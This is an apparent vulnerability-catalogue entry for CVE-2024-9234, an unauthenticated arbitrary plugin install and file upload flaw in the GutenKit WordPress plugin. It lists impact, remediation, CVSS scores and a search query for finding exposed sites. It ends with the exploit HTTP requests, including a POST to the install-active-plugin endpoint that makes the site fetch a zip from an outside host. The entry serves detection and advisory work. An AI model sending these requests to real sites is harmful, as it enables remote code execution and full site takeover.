---
layout: post
cve_id: CVE-2024-9234
title: GutenKit <= 2.1.0 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2024/CVE-2024-9234.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9234.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can install and activate arbitrary WordPress plugins
  or upload files disguised as plugins, enabling remote code execution and complete
  WordPress site compromise.

  '
remediation: 'Update GutenKit plugin to a version later than 2.1.0 that implements
  proper capability checks on the install_and_activate_plugin_from_external function
  and REST API endpoint.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-9234
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/gutenkit-blocks-addon/gutenkit-210-unauthenticated-arbitrary-file-upload
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-9234
  cwe-id: CWE-862
  epss-score: 0.92975
  epss-percentile: 0.99765
metadata:
  verified: true
  max-request: 2
  vendor: wpmet
  product: gutenkit
  framework: wordpress
  fofa-query: body="wp-content/plugins/gutenkit-blocks-addon"
tags:
- cve
- cve2024
- wordpress
- wp-plugin
- gutenkit
- file-upload
- intrusive
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The GutenKit Page Builder Blocks, Patterns, and Templates for Gutenberg Block Editor plugin for WordPress is vulnerable to arbitrary file uploads due to a missing capability check on the install_and_activate_plugin_from_external() function (install-active-plugin REST API endpoint) in all versions up to, and including, 2.1.0. This makes it possible for unauthenticated attackers to install and activate arbitrary plugins, or utilize the functionality to upload arbitrary files spoofed like plugins.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-json/gutenkit/v1/install-active-plugin HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13) AppleWebKit/619.4 (KHTML, like Gecko) Version/16.1.13 Safari/619.4
Connection: close
Content-Length: 72
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

plugin=http://d5jkcj1le0o4a50hp3rg8ohp5ss9351u4.oast.online/jFGpTRqM.zip
```

